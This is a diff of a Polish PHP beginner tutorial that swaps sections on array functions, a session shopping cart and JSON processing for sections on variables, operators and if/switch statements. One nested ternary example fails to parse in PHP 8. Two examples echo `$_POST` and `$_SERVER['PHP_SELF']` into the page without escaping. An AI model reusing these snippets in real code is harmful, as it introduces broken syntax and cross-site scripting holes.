-                <td style="padding: 8px; border-right: 1px solid #C8E6C9; text-align: center; color: #2E7D32; background-color: #F1F8E9;">2</td>
-                <td style="padding: 8px; color:rgb(136, 109, 13)" >gruszka</td>
-            </tr>
-        </table>
-    </div>
-
-  <div style="flex: 1; min-width: 300px; border-radius: 8px; overflow: hidden;">
-        <div style="background-color: #FF9800; color: white; padding: 8px; text-align: center; font-weight: bold;">
-            Tablica asocjacyjna $osoba
-        </div>
-        <table style="width: 100%; border-collapse: collapse; background-color: white;">
-            <tr style="background-color: #FFF3E0;">
-                <th style="padding: 8px; border-right: 1px solid #FFECB3; color: #E65100; font-weight: bold;">Klucz</th>
-                <th style="padding: 8px; color: #E65100; font-weight: bold;">Wartość</th>
-            </tr>
-            <tr>
-                <td style="padding: 8px; border-right: 1px solid #FFECB3; text-align: center; color: #FF6D00; background-color: #FFF8E1;">imie</td>
-                <td style="padding: 8px; color:rgb(149, 25, 25)" >Anna</td>
-            </tr>
-            <tr>
-                <td style="padding: 8px; border-right: 1px solid #FFECB3; text-align: center; color: #FF6D00; background-color: #FFF8E1;">wiek</td>
-                <td style="padding: 8px; color:rgb(149, 25, 25)">30</td>
-            </tr>
-            <tr>
-                <td style="padding: 8px; border-right: 1px solid #FFECB3; text-align: center; color: #FF6D00; background-color: #FFF8E1;">miasto</td>
-                <td style="padding: 8px; color:rgb(149, 25, 25)">Warszawa</td>
-            </tr>
-        </table>
-    </div>
-
-</div>
-
-### Zaawansowane operacje na tablicach
-
-#### 1. Łączenie tablic
-
-```php
-<?php
-$owoce = ["jabłko", "banan", "gruszka"];
-$warzywa = ["marchew", "pomidor", "ogórek"];
-
-// Metoda 1: array_merge() - łączy tablice
-$zdrowa_zywnosc = array_merge($owoce, $warzywa);
-print_r($zdrowa_zywnosc);
-// Array ( [0] => jabłko [1] => banan [2] => gruszka [3] => marchew [4] => pomidor [5] => ogórek )
-
-// Metoda 2: operator + (zachowuje unikalne klucze)
-$ceny1 = ["jabłko" => 2.5, "banan" => 3.0];
-$ceny2 = ["banan" => 2.8, "gruszka" => 4.0]; // Uwaga na duplikaty!
-
-$wszystkie_ceny = $ceny1 + $ceny2; // Zachowa wartości z $ceny1 dla duplikatów
-print_r($wszystkie_ceny);
-// Array ( [jabłko] => 2.5 [banan] => 3.0 [gruszka] => 4.0 )
-
-// Metoda 3: array_merge_recursive() - dla bardziej złożonych struktur
-$produkt1 = ["owoce" => ["jabłko", "banan"], "cena" => 10];
-$produkt2 = ["owoce" => ["gruszka"], "kolor" => "czerwony"];
-
-$polaczony = array_merge_recursive($produkt1, $produkt2);
-print_r($polaczony);
-/*
-Array (
-    [owoce] => Array (
-        [0] => jabłko
-        [1] => banan
-        [2] => gruszka
-    )
-    [cena] => 10
-    [kolor] => czerwony
-)
-*/
-?>
-```
-
-#### 2. Filtrowanie tablic
-
-```php
-<?php
-$liczby = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
-
-// Filtrowanie liczb parzystych
-$parzyste = array_filter($liczby, function($n) {
-    return $n % 2 === 0;
-});
-print_r($parzyste); // Array ( [1] => 2 [3] => 4 [5] => 6 [7] => 8 [9] => 10 )
-
-// Krótszy zapis z arrow functions (PHP 7.4+)
-$nieparzyste = array_filter($liczby, fn($n) => $n % 2 !== 0);
-print_r($nieparzyste); // Array ( [0] => 1 [2] => 3 [4] => 5 [6] => 7 [8] => 9 )
-
-// Filtrowanie z zachowaniem kluczy
-$dane = ["jabłko" => 2.5, "banan" => 3.0, "gruszka" => 4.2, "cytryna" => 2.2];
-
-// Produkty droższe niż 3.0
-$drogie = array_filter($dane, function($cena) {
-    return $cena > 3.0;
-});
-print_r($drogie); // Array ( [gruszka] => 4.2 )
-
-// Od PHP 5.6 możemy używać ARRAY_FILTER_USE_KEY do filtrowania po kluczach
-$owoce_na_c = array_filter($dane, function($klucz) {
-    return $klucz[0] === "c"; // Pierwszy znak to "c"
-}, ARRAY_FILTER_USE_KEY);
-print_r($owoce_na_c); // Array ( [cytryna] => 2.2 )
-?>
-```
-
-#### 3. Mapowanie tablic
-
-```php
-<?php
-$liczby = [1, 2, 3, 4, 5];
-
-// Podwojenie każdej liczby
-$podwojone = array_map(function($n) {
-    return $n * 2;
-}, $liczby);
-print_r($podwojone); // Array ( [0] => 2 [1] => 4 [2] => 6 [3] => 8 [4] => 10 )
-
-// Mapowanie z wieloma tablicami
-$imiona = ["Jan", "Anna", "Piotr"];
-$nazwiska = ["Kowalski", "Nowak", "Wiśniewski"];
-
-$pelne_imiona = array_map(function($imie, $nazwisko) {
-    return $imie . " " . $nazwisko;
-}, $imiona, $nazwiska);
-print_r($pelne_imiona); // Array ( [0] => Jan Kowalski [1] => Anna Nowak [2] => Piotr Wiśniewski )
-
-// Mapowanie tablicy asocjacyjnej
-$produkty = [
-    ["nazwa" => "Laptop", "cena" => 4000],
-    ["nazwa" => "Telefon", "cena" => 2000],
-    ["nazwa" => "Tablet", "cena" => 1500]
-];
-
-// Dodanie podatku VAT (23%)
-$z_vatem = array_map(function($produkt) {
-    $produkt["cena_z_vat"] = $produkt["cena"] * 1.23;
-    return $produkt;
-}, $produkty);
-
-foreach ($z_vatem as $produkt) {
-    echo "{$produkt['nazwa']}: {$produkt['cena']} zł netto, {$produkt['cena_z_vat']} zł brutto<br>";
-}
-?>
-```
-
-#### 4. Redukowanie tablic
-
-```php
-<?php
-$liczby = [1, 2, 3, 4, 5];
-
-// Suma wszystkich elementów
-$suma = array_reduce($liczby, function($wynik, $element) {
-    return $wynik + $element;
-}, 0); // 0 to wartość początkowa
-echo "Suma: $suma<br>"; // Suma: 15
-
-// Iloczyn wszystkich elementów
-$iloczyn = array_reduce($liczby, function($wynik, $element) {
-    return $wynik * $element;
-}, 1); // 1 to wartość początkowa
-echo "Iloczyn: $iloczyn<br>"; // Iloczyn: 120
-
-// Budowanie HTML na podstawie tablicy
-$menu = ["Strona główna", "O nas", "Kontakt", "Blog"];
-
-$html = array_reduce($menu, function($html, $element) {
-    return $html . "<li><a href='#'>$element</a></li>\n";
-}, "<ul>\n") . "</ul>";
-
-echo $html;
-/* Wyświetli:
-<ul>
-<li><a href='#'>Strona główna</a></li>
-<li><a href='#'>O nas</a></li>
-<li><a href='#'>Kontakt</a></li>
-<li><a href='#'>Blog</a></li>
-</ul>
-*/
-?>
-```
-
-### Praktyczne przykłady zastosowań tablic
-
-#### 1. Obsługa formularza z wieloma wartościami
-
-```php
-<?php
-// Symulowane dane z formularza (normalnie byłyby z $_POST)
-$dane_formularza = [
-    "imie" => "Jan",
-    "nazwisko" => "Kowalski",
-    "zainteresowania" => ["programowanie", "muzyka", "sport"],
-    "jezyki" => ["php", "javascript"]
-];
-
-// Walidacja - sprawdzenie, czy wszystkie wymagane pola są wypełnione
-$wymagane_pola = ["imie", "nazwisko", "email"];
-$brakujace_pola = [];
-
-foreach ($wymagane_pola as $pole) {
-    if (!isset($dane_formularza[$pole]) || empty($dane_formularza[$pole])) {
-        $brakujace_pola[] = $pole;
+    $czyZalogowany = true;
+    $czyAdmin = false;
+    
+    // Użycie w warunkach
+    if ($czyZalogowany) {
+        echo "Witaj!";
     }
-}
-
-if (!empty($brakujace_pola)) {
-    echo "Proszę wypełnić następujące pola: " . implode(", ", $brakujace_pola);
-} else {
-    echo "Formularz wypełniony poprawnie!<br>";
-
-    // Wyświetlenie danych z formularza
-    echo "Imię i nazwisko: {$dane_formularza['imie']} {$dane_formularza['nazwisko']}<br>";
-
-    if (!empty($dane_formularza["zainteresowania"])) {
-        echo "Zainteresowania: " . implode(", ", $dane_formularza["zainteresowania"]) . "<br>";
-    }
-
-    if (!empty($dane_formularza["jezyki"])) {
-        echo "Języki programowania: " . implode(", ", $dane_formularza["jezyki"]) . "<br>";
-    }
-}
 ?>
 ```
 
-#### 2. Koszyk zakupowy
+#### **5. NULL (brak wartości)**
+
+Oznacza, że zmienna nie ma wartości:
 
 ```php
 <?php
-// Symulacja koszyka zakupowego z użyciem sesji
-session_start();
+    $pusty = null;
+    
+    // Sprawdzanie czy zmienna jest null
+    if ($pusty === null) {
+        echo "Zmienna jest pusta";
+    }
+?>
+```
 
-// Inicjalizacja koszyka, jeśli nie istnieje
-if (!isset($_SESSION['koszyk'])) {
-    $_SESSION['koszyk'] = [];
-}
+#### **6. ARRAY (tablica)**
 
-// Funkcja do dodawania produktu
-function dodaj_do_koszyka($id, $nazwa, $cena, $ilosc = 1) {
-    // Jeśli produkt już istnieje w koszyku, zwiększ ilość
-    if (isset($_SESSION['koszyk'][$id])) {
-        $_SESSION['koszyk'][$id]['ilosc'] += $ilosc;
+Przechowuje wiele wartości (omówione szczegółowo w rozdziale 7):
+
+```php
+<?php
+    $owoce = ["jabłko", "banan", "gruszka"];
+    $osoba = ["imie" => "Jan", "wiek" => 25];
+?>
+```
+
+### **Sprawdzanie typu zmiennej**
+
+```php
+<?php
+    $zmienna = "test";
+    
+    echo gettype($zmienna);     // string
+    var_dump($zmienna);         // string(4) "test"
+    
+    // Sprawdzanie konkretnego typu
+    is_string($zmienna);        // true
+    is_int($zmienna);           // false
+    is_float($zmienna);         // false
+    is_bool($zmienna);          // false
+    is_array($zmienna);         // false
+    is_null($zmienna);          // false
+?>
+```
+
+### **Wyświetlanie zmiennych**
+
+```php
+<?php
+    $imie = "Anna";
+    $wiek = 20;
+    $wzrost = 165.5;
+    
+    // Sposób 1: echo bezpośrednio
+    echo $imie;
+    
+    // Sposób 2: w cudzysłowie podwójnym
+    echo "Mam na imię $imie";
+    
+    // Sposób 3: łączenie kropką
+    echo "Mam na imię " . $imie . " i mam " . $wiek . " lat";
+    
+    // Sposób 4: w nawiasach klamrowych (gdy nazwa zmiennej się skleja)
+    echo "Test{$imie}123";
+    
+    // UWAGA: W pojedynczym cudzysłowie NIE działa
+    echo 'Mam na imię $imie';  // Wyświetli: Mam na imię $imie
+?>
+```
+
+### **Konkatenacja (łączenie tekstów)**
+
+```php
+<?php
+    $imie = "Jan";
+    $nazwisko = "Kowalski";
+    
+    // Łączenie kropką
+    $pelneImie = $imie . " " . $nazwisko;
+    echo $pelneImie;  // Jan Kowalski
+    
+    // Łączenie z przypisaniem
+    $tekst = "Hello";
+    $tekst .= " World";  // $tekst = $tekst . " World"
+    echo $tekst;  // Hello World
+?>
+```
+
+### **Konwersja typów**
+
+PHP automatycznie konwertuje typy, ale możesz to robić ręcznie:
+
+```php
+<?php
+    // Automatyczna konwersja
+    $liczba = "10";  // String
+    $suma = $liczba + 5;  // PHP zamieni "10" na 10
+    echo $suma;  // 15
+    
+    // Ręczna konwersja (casting)
+    $tekst = "123";
+    $liczba = (int)$tekst;      // String → Integer
+    $zmiennoprzecinkowa = (float)"19.99";  // String → Float
+    $bool = (bool)1;            // Integer → Boolean (1 = true, 0 = false)
+    $string = (string)123;      // Integer → String
+    
+    // Funkcje konwertujące
+    $int = intval("123");       // String → Integer
+    $float = floatval("19.99"); // String → Float
+    $str = strval(123);         // Integer → String
+?>
+```
+
+### **Stałe - wartości niezmienne**
+
+Stała to wartość, która **NIE MOŻE** się zmienić po zdefiniowaniu:
+
+```php
+<?php
+    // Definiowanie stałej
+    define("STAWKA_VAT", 0.23);
+    define("NAZWA_FIRMY", "Moja Firma Sp. z o.o.");
+    define("MAX_ROZMIAR_PLIKU", 5242880); // 5MB w bajtach
+    
+    // Użycie
+    echo STAWKA_VAT;        // 0.23
+    echo NAZWA_FIRMY;       // Moja Firma Sp. z o.o.
+    
+    // Nie można zmienić wartości!
+    STAWKA_VAT = 0.25;  // ❌ BŁĄD!
+?>
+```
+
+**Różnice między zmienną a stałą:**
+
+| Cecha | Zmienna | Stała |
+|-------|---------|-------|
+| Znak na początku | `$` | Brak |
+| Można zmienić wartość? | TAK | NIE |
+| Konwencja nazewnictwa | camelCase | WIELKIE_LITERY |
+| Zakres | Lokalny/globalny | Zawsze globalny |
+| Przykład | `$cenaProductu` | `STAWKA_VAT` |
+
+### **Zmienne predefiniowane (superglobalne)**
+
+PHP ma wbudowane specjalne zmienne, dostępne wszędzie:
+
+```php
+<?php
+    $_GET       // Dane z formularza metodą GET
+    $_POST      // Dane z formularza metodą POST
+    $_SERVER    // Informacje o serwerze
+    $_SESSION   // Dane sesji
+    $_COOKIE    // Ciasteczka
+    $_FILES     // Przesłane pliki
+    
+    // Przykłady użycia:
+    echo $_SERVER["PHP_SELF"];          // Nazwa aktualnego skryptu
+    echo $_SERVER["SERVER_NAME"];       // Nazwa serwera
+    echo $_SERVER["REQUEST_METHOD"];    // POST, GET, etc.
+    echo $_SERVER["REMOTE_ADDR"];       // IP użytkownika
+?>
+```
+
+### **Zakres zmiennych (scope)**
+
+```php
+<?php
+    $globalnaZmienna = "Jestem globalną";
+    
+    function testZmiennej() {
+        $lokalnaZmienna = "Jestem lokalną";
+        
+        echo $lokalnaZmienna;       // ✅ Działa
+        echo $globalnaZmienna;      // ❌ NIE działa (zmienna globalna niedostępna)
+        
+        // Aby użyć zmiennej globalnej w funkcji:
+        global $globalnaZmienna;
+        echo $globalnaZmienna;      // ✅ Teraz działa
+    }
+    
+    echo $lokalnaZmienna;  // ❌ NIE działa (zmienna lokalna niedostępna poza funkcją)
+?>
+```
+
+---
+
+## **4. Operatory - wykonywanie działań na danych**
+
+### **Operatory arytmetyczne (matematyka)**
+
+Służą do wykonywania obliczeń matematycznych:
+
+```php
+<?php
+    $a = 10;
+    $b = 3;
+    
+    echo $a + $b;   // Dodawanie: 13
+    echo $a - $b;   // Odejmowanie: 7
+    echo $a * $b;   // Mnożenie: 30
+    echo $a / $b;   // Dzielenie: 3.333...
+    echo $a % $b;   // Modulo (reszta z dzielenia): 1
+    echo $a ** $b;  // Potęgowanie: 1000 (10³)
+?>
+```
+
+#### **Modulo - szczegółowe wyjaśnienie**
+
+Operator `%` zwraca resztę z dzielenia:
+
+```php
+<?php
+    echo 10 % 3;  // 1 (10 ÷ 3 = 3 reszty 1)
+    echo 15 % 4;  // 3 (15 ÷ 4 = 3 reszty 3)
+    echo 20 % 5;  // 0 (20 ÷ 5 = 4 reszty 0)
+    
+    // Praktyczne zastosowanie - sprawdzanie parzystości
+    $liczba = 7;
+    if ($liczba % 2 == 0) {
+        echo "Liczba parzysta";
     } else {
-        // W przeciwnym razie dodaj nowy produkt
-        $_SESSION['koszyk'][$id] = [
-            'nazwa' => $nazwa,
-            'cena' => $cena,
-            'ilosc' => $ilosc
-        ];
+        echo "Liczba nieparzysta";
     }
-}
-
-// Funkcja do usuwania produktu
-function usun_z_koszyka($id) {
-    if (isset($_SESSION['koszyk'][$id])) {
-        unset($_SESSION['koszyk'][$id]);
-    }
-}
-
-// Funkcja do obliczania sumy koszyka
-function oblicz_sume_koszyka() {
-    $suma = 0;
-    foreach ($_SESSION['koszyk'] as $produkt) {
-        $suma += $produkt['cena'] * $produkt['ilosc'];
-    }
-    return $suma;
-}
-
-// Symulacja dodawania produktów
-dodaj_do_koszyka(1, "Laptop Dell", 3500, 1);
-dodaj_do_koszyka(2, "Mysz bezprzewodowa", 120, 2);
-dodaj_do_koszyka(1, "Laptop Dell", 3500, 1); // Dodanie kolejnego tego samego produktu
-
-// Wyświetlenie zawartości koszyka
-echo "<h3>Zawartość koszyka:</h3>";
-echo "<table border='1' cellpadding='5'>";
-echo "<tr><th>Produkt</th><th>Cena</th><th>Ilość</th><th>Wartość</th></tr>";
-
-foreach ($_SESSION['koszyk'] as $id => $produkt) {
-    $wartosc = $produkt['cena'] * $produkt['ilosc'];
-    echo "<tr>";
-    echo "<td>{$produkt['nazwa']}</td>";
-    echo "<td>{$produkt['cena']} zł</td>";
-    echo "<td>{$produkt['ilosc']}</td>";
-    echo "<td>{$wartosc} zł</td>";
-    echo "</tr>";
-}
-
-$suma = oblicz_sume_koszyka();
-echo "<tr><td colspan='3' align='right'><strong>SUMA:</strong></td><td>{$suma} zł</td></tr>";
-echo "</table>";
-
-// Usunięcie produktu i ponowne obliczenie
-usun_z_koszyka(2);
-echo "<p>Usunięto produkt o ID 2</p>";
-
-$suma = oblicz_sume_koszyka();
-echo "<p>Nowa suma koszyka: {$suma} zł</p>";
 ?>
 ```
 
-#### 3. Przetwarzanie danych JSON
+#### **Kolejność wykonywania działań**
+
+PHP przestrzega matematycznej kolejności działań:
 
 ```php
 <?php
-// Przykładowe dane JSON (np. z API)
-$json_data = '
-{
-    "produkty": [
-        {"id": 1, "nazwa": "Laptop", "cena": 3500, "kategoria": "elektronika"},
-        {"id": 2, "nazwa": "Smartfon", "cena": 2000, "kategoria": "elektronika"},
-        {"id": 3, "nazwa": "Książka PHP", "cena": 59, "kategoria": "książki"},
-        {"id": 4, "nazwa": "Mysz", "cena": 100, "kategoria": "elektronika"},
-        {"id": 5, "nazwa": "Klawiatura", "cena": 150, "kategoria": "elektronika"}
-    ]
-}
-';
+    echo 2 + 3 * 4;       // 14 (najpierw mnożenie, potem dodawanie)
+    echo (2 + 3) * 4;     // 20 (nawiasy mają najwyższy priorytet)
+    
+    // Priorytet operatorów (od najwyższego):
+    // 1. ()           - nawiasy
+    // 2. **           - potęgowanie
+    // 3. *, /, %      - mnożenie, dzielenie, modulo
+    // 4. +, -         - dodawanie, odejmowanie
+?>
+```
 
-// Dekodowanie JSON do tablicy PHP
-$dane = json_decode($json_data, true);
+### **Operatory przypisania**
 
-// Sprawdzenie czy dekodowanie się powiodło
-if (json_last_error() !== JSON_ERROR_NONE) {
-    echo "Błąd dekodowania JSON: " . json_last_error_msg();
-    exit;
-}
+#### **Podstawowe przypisanie**
 
-// Filtrowanie produktów z kategorii "elektronika"
-$elektronika = array_filter($dane['produkty'], function($produkt) {
-    return $produkt['kategoria'] === 'elektronika';
-});
+```php
+<?php
+    $x = 10;  // Przypisz wartość 10 do zmiennej $x
+?>
+```
 
-// Liczenie średniej ceny produktów z kategorii "elektronika"
-$suma_cen = array_reduce($elektronika, function($suma, $produkt) {
-    return $suma + $produkt['cena'];
-}, 0);
+#### **Operatory skrócone**
 
-$srednia_cena = $suma_cen / count($elektronika);
+```php
+<?php
+    $x = 10;
+    
+    $x += 5;   // $x = $x + 5   →  15
+    $x -= 3;   // $x = $x - 3   →  12
+    $x *= 2;   // $x = $x * 2   →  24
+    $x /= 4;   // $x = $x / 4   →  6
+    $x %= 4;   // $x = $x % 4   →  2
+    
+    // Dla stringów
+    $tekst = "Hello";
+    $tekst .= " World";  // $tekst = $tekst . " World"  →  "Hello World"
+?>
+```
 
-echo "<h3>Produkty z kategorii elektronika:</h3>";
-echo "<ul>";
-foreach ($elektronika as $produkt) {
-    echo "<li>{$produkt['nazwa']} - {$produkt['cena']} zł</li>";
-}
-echo "</ul>";
-echo "<p>Średnia cena: " . number_format($srednia_cena, 2) . " zł</p>";
+#### **Inkrementacja i dekrementacja**
 
-// Grupowanie produktów według kategorii
-$grupy = [];
-foreach ($dane['produkty'] as $produkt) {
-    $kategoria = $produkt['kategoria'];
-    if (!isset($grupy[$kategoria])) {
-        $grupy[$kategoria] = [];
+```php
+<?php
+    $licznik = 5;
+    
+    // Inkrementacja (zwiększanie o 1)
+    $licznik++;    // $licznik = 6  (post-inkrementacja)
+    ++$licznik;    // $licznik = 7  (pre-inkrementacja)
+    
+    // Dekrementacja (zmniejszanie o 1)
+    $licznik--;    // $licznik = 6  (post-dekrementacja)
+    --$licznik;    // $licznik = 5  (pre-dekrementacja)
+    
+    // Różnica między pre i post:
+    $a = 5;
+    $b = $a++;  // $b = 5, $a = 6 (najpierw przypisanie, potem zwiększenie)
+    
+    $a = 5;
+    $b = ++$a;  // $b = 6, $a = 6 (najpierw zwiększenie, potem przypisanie)
+?>
+```
+
+### **Operatory porównania**
+
+Porównują dwie wartości i zwracają `true` lub `false`:
+
+```php
+<?php
+    $a = 10;
+    $b = "10";
+    $c = 5;
+    
+    // Równość (sprawdza tylko wartość)
+    var_dump($a == $b);    // true (10 == "10")
+    
+    // Identyczność (sprawdza wartość I typ)
+    var_dump($a === $b);   // false (int !== string)
+    
+    // Nierówność
+    var_dump($a != $c);    // true
+    var_dump($a <> $c);    // true (alternatywna składnia)
+    
+    // Nieidentyczność
+    var_dump($a !== $b);   // true
+    
+    // Większy, mniejszy
+    var_dump($a > $c);     // true (10 > 5)
+    var_dump($a < $c);     // false (10 < 5)
+    
+    // Większy lub równy, mniejszy lub równy
+    var_dump($a >= 10);    // true
+    var_dump($a <= 9);     // false
+?>
+```
+
+#### **Tabela porównań - == vs ===**
+
+| Porównanie | `==` (równość) | `===` (identyczność) |
+|------------|----------------|----------------------|
+| `5 == 5` | TRUE | TRUE |
+| `5 == "5"` | TRUE | FALSE (różne typy) |
+| `0 == false` | TRUE | FALSE (różne typy) |
+| `"" == false` | TRUE | FALSE (różne typy) |
+| `null == false` | TRUE | FALSE (różne typy) |
+
+**Najlepsza praktyka:** Używaj `===` zamiast `==` (jest bezpieczniejszy)!
+
+### **Operatory logiczne**
+
+Łączą warunki logiczne:
+
+```php
+<?php
+    $wiek = 20;
+    $maKonto = true;
+    $jestAktywny = true;
+    
+    // AND (&&) - oba warunki muszą być prawdziwe
+    if ($wiek >= 18 && $maKonto) {
+        echo "Może kupować";  // Wykona się, bo oba warunki to true
     }
-    $grupy[$kategoria][] = $produkt;
-}
+    
+    // OR (||) - wystarczy jeden warunek prawdziwy
+    if ($wiek < 18 || !$maKonto) {
+        echo "Nie może kupować";
+    }
+    
+    // NOT (!) - odwraca wartość
+    if (!$jestAktywny) {
+        echo "Konto nieaktywne";
+    }
+    
+    // AND - alternatywna składnia
+    if ($wiek >= 18 and $maKonto) {
+        echo "Może kupować";
+    }
+    
+    // OR - alternatywna składnia
+    if ($wiek < 18 or !$maKonto) {
+        echo "Nie może kupować";
+    }
+?>
+```
 
-// Wyświetlenie produktów pogrupowanych według kategorii
-echo "<h3>Produkty według kategorii:</h3>";
-foreach ($grupy as $kategoria => $produkty) {
-    echo "<h4>$kategoria</h4>";
+#### **Tabela logiczna dla AND (&&)**
+
+| A | B | A && B |
+|---|---|--------|
+| true | true | TRUE |
+| true | false | FALSE |
+| false | true | FALSE |
+| false | false | FALSE |
+
+#### **Tabela logiczna dla OR (||)**
+
+| A | B | A \|\| B |
+|---|---|----------|
+| true | true | TRUE |
+| true | false | TRUE |
+| false | true | TRUE |
+| false | false | FALSE |
+
+#### **Tabela logiczna dla NOT (!)**
+
+| A | !A |
+|---|-----|
+| true | FALSE |
+| false | TRUE |
+
+### **Operator trójargumentowy (ternary)**
+
+Skrócona wersja `if-else`:
+
+```php
+<?php
+    // Składnia: (warunek) ? wartość_gdy_true : wartość_gdy_false
+    
+    $wiek = 20;
+    $status = ($wiek >= 18) ? "Pełnoletni" : "Niepełnoletni";
+    echo $status;  // Pełnoletni
+    
+    // To samo co:
+    if ($wiek >= 18) {
+        $status = "Pełnoletni";
+    } else {
+        $status = "Niepełnoletni";
+    }
+    
+    // Więcej przykładów:
+    $punkty = 75;
+    $ocena = ($punkty >= 50) ? "Zaliczony" : "Niezaliczony";
+    
+    $cena = 100;
+    $rabat = ($cena > 50) ? 10 : 5;  // Rabat 10 zł jeśli cena > 50, inaczej 5 zł
+?>
+```
+
+### **Operator złączenia null (??) - PHP 7+**
+
+Zwraca pierwszą wartość, która nie jest `null`:
+
+```php
+<?php
+    // Bez operatora ??
+    $uzytkownik = isset($_GET["user"]) ? $_GET["user"] : "Gość";
+    
+    // Z operatorem ?? (krócej i czytelniej)
+    $uzytkownik = $_GET["user"] ?? "Gość";
+    
+    // Łańcuchowanie
+    $wartosc = $opcja1 ?? $opcja2 ?? $opcja3 ?? "domyślna";
+    
+    // Przykład praktyczny
+    $imie = $_POST["imie"] ?? "Nieznany";
+    echo "Witaj, $imie!";
+?>
+```
+
+### **Operatory stringowe (tekstowe)**
+
+```php
+<?php
+    // Konkatenacja (łączenie) - operator .
+    $imie = "Jan";
+    $nazwisko = "Kowalski";
+    $pelneImie = $imie . " " . $nazwisko;  // Jan Kowalski
+    
+    // Konkatenacja z przypisaniem - operator .=
+    $tekst = "Hello";
+    $tekst .= " World";  // Hello World
+    $tekst .= "!";       // Hello World!
+?>
+```
+
+### **Priorytet operatorów (od najwyższego)**
+
+| Priorytet | Operatory | Opis |
+|-----------|-----------|------|
+| 1 | `()` | Nawiasy |
+| 2 | `**` | Potęgowanie |
+| 3 | `++`, `--`, `!` | Inkrementacja, dekrementacja, negacja |
+| 4 | `*`, `/`, `%` | Mnożenie, dzielenie, modulo |
+| 5 | `+`, `-`, `.` | Dodawanie, odejmowanie, konkatenacja |
+| 6 | `<`, `<=`, `>`, `>=` | Porównania |
+| 7 | `==`, `!=`, `===`, `!==` | Równość, identyczność |
+| 8 | `&&` | AND logiczne |
+| 9 | `\|\|` | OR logiczne |
+| 10 | `=`, `+=`, `-=`, itd. | Przypisanie |
+
+---
+
+## **5. Instrukcje warunkowe - podejmowanie decyzji**
+
+Instrukcje warunkowe pozwalają wykonywać różny kod w zależności od spełnienia warunków.
+
+### **Instrukcja IF - podstawowa**
+
+Wykonuje kod tylko gdy warunek jest prawdziwy:
+
+```php
+<?php
+    $wiek = 20;
+    
+    if ($wiek >= 18) {
+        echo "Jesteś pełnoletni";
+        echo "Możesz głosować";
+    }
+?>
+```
+
+**Schemat działania:**
+```
+JEŚLI warunek jest prawdziwy
+    TO wykonaj ten kod
+KONIEC
+```
+
+### **Instrukcja IF-ELSE**
+
+Wykonuje jeden kod gdy warunek prawdziwy, inny gdy fałszywy:
+
+```php
+<?php
+    $wiek = 15;
+    
+    if ($wiek >= 18) {
+        echo "Jesteś pełnoletni";
+        echo "Możesz wejść";
+    } else {
+        echo "Jesteś niepełnoletni";
+        echo "Nie możesz wejść";
+    }
+?>
+```
+
+**Schemat działania:**
+```
+JEŚLI warunek jest prawdziwy
+    TO wykonaj kod A
+W PRZECIWNYM RAZIE
+    wykonaj kod B
+KONIEC
+```
+
+### **Instrukcja IF-ELSEIF-ELSE**
+
+Sprawdza wiele warunków po kolei:
+
+```php
+<?php
+    $ocena = 4;
+    
+    if ($ocena == 6) {
+        echo "Celujący! Wspaniale!";
+    } elseif ($ocena == 5) {
+        echo "Bardzo dobry! Świetna robota!";
+    } elseif ($ocena == 4) {
+        echo "Dobry! Niezła robota!";
+    } elseif ($ocena == 3) {
+        echo "Dostateczny. Można lepiej!";
+    } elseif ($ocena == 2) {
+        echo "Dopuszczający. Musisz popracować!";
+    } else {
+        echo "Niedostateczny. Trzeba się douczyć!";
+    }
+?>
+```
+
+#### **Przykład praktyczny - kalkulator rabatu**
+
+```php
+<?php
+    $kwotaZakupow = 250;
+    $rabat = 0;
+    
+    if ($kwotaZakupow >= 500) {
+        $rabat = 20;  // 20% rabatu dla zakupów powyżej 500 zł
+    } elseif ($kwotaZakupow >= 200) {
+        $rabat = 10;  // 10% rabatu dla zakupów powyżej 200 zł
+    } elseif ($kwotaZakupow >= 100) {
+        $rabat = 5;   // 5% rabatu dla zakupów powyżej 100 zł
+    }
+    
+    $kwotaPoRabacie = $kwotaZakupow * (1 - $rabat / 100);
+    echo "Kwota: $kwotaZakupow zł<br>";
+    echo "Rabat: $rabat%<br>";
+    echo "Do zapłaty: $kwotaPoRabacie zł";
+?>
+```
+
+### **Zagnieżdżone warunki**
+
+Warunki w warunkach:
+
+```php
+<?php
+    $wiek = 20;
+    $maKonto = true;
+    $weryfikacja = true;
+    
+    if ($wiek >= 18) {
+        if ($maKonto) {
+            if ($weryfikacja) {
+                echo "Możesz kupić";
+            } else {
+                echo "Konto niezweryfikowane";
+            }
+        } else {
+            echo "Musisz założyć konto";
+        }
+    } else {
+        echo "Jesteś za młody";
+    }
+    
+    // Lepszy sposób - łączenie warunków operatorami logicznymi:
+    if ($wiek >= 18 && $maKonto && $weryfikacja) {
+        echo "Możesz kupić";
+    }
+?>
+```
+
+### **Operator trójargumentowy (ternary) - skrócony IF**
+
+```php
+<?php
+    $wiek = 20;
+    
+    // Normalny if-else
+    if ($wiek >= 18) {
+        $status = "Pełnoletni";
+    } else {
+        $status = "Niepełnoletni";
+    }
+    
+    // Operator trójargumentowy (to samo krócej)
+    $status = ($wiek >= 18) ? "Pełnoletni" : "Niepełnoletni";
+    
+    // Więcej przykładów:
+    $punkty = 75;
+    $wynik = ($punkty >= 50) ? "Zaliczony" : "Niezaliczony";
+    
+    $temperatura = 25;
+    $pogoda = ($temperatura > 20) ? "Ciepło" : "Zimno";
+    
+    // Można zagnieżdżać (ale lepiej unikać - mało czytelne)
+    $ocena = ($punkty >= 90) ? "A" : ($punkty >= 75) ? "B" : "C";
+?>
+```
+
+### **Instrukcja SWITCH - wiele konkretnych wartości**
+
+Używana gdy sprawdzamy jedną zmienną na wiele konkretnych wartości:
+
+```php
+<?php
+    $dzien = "poniedziałek";
+    
+    switch ($dzien) {
+        case "poniedziałek":
+            echo "Rozpoczynamy tydzień!";
+            break;
+        
+        case "wtorek":
+        case "środa":
+        case "czwartek":
+            echo "Środek tygodnia";
+            break;
+        
+        case "piątek":
+            echo "Prawie weekend!";
+            break;
+        
+        case "sobota":
+        case "niedziela":
+            echo "Weekend! Czas na odpoczynek!";
+            break;
+        
+        default:
+            echo "Nieznany dzień";
+    }
+?>
+```
+
+**WAŻNE:** `break;` kończy wykonywanie switch. Bez niego kod "przechodzi" do kolejnego case!
+
+#### **Przykład bez break (efekt fall-through):**
+
+```php
+<?php
+    $liczba = 2;
+    
+    switch ($liczba) {
+        case 1:
+            echo "Jeden ";
+            // Brak break!
+        case 2:
+            echo "Dwa ";
+            // Brak break!
+        case 3:
+            echo "Trzy";
+            break;
+    }
+    
+    // Wyświetli: Dwa Trzy
+    // Bo brakuje break w case 2, więc kod "spada" dalej
+?>
+```
+
+#### **Praktyczny przykład - kalkulator ocen**
+
+```php
+<?php
+    $punkty = 85;
